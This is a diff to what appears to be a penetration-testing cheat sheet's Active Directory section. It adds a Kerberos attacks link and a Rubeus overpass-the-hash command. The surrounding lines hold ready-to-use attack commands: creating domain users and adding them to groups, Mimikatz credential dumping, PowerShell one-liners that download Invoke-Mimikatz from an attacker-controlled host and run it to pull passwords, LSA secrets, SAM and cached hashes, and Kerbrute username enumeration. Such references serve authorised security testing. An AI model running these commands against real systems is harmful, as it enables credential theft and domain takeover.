@@ -668,6 +668,8 @@ download {FILE.exe}
 
 ![Active Directory](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
 
+[https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks](https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks)
+
 ```bash
 # Enumerate all local accounts
 net user
@@ -687,10 +689,14 @@ net user {USERNAME} {PASSWORD} /add /domain
 # Add user to group
 net group "{GROUP}" {USERNAME} /add
 
-# MimiKatz Cred Dump
+# MimiKatz Cred Dump Pass the Hash
 sekurlsa::logonpasswords
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds 
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
+
+# Rubeus Overpass the hash
+rubeus.exe asktgt /domain:{DOMAIN}/user:{USER} /rc4:{NT HASH} /ptt
+klist
 
 # Kerbrute Brute Force
 sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
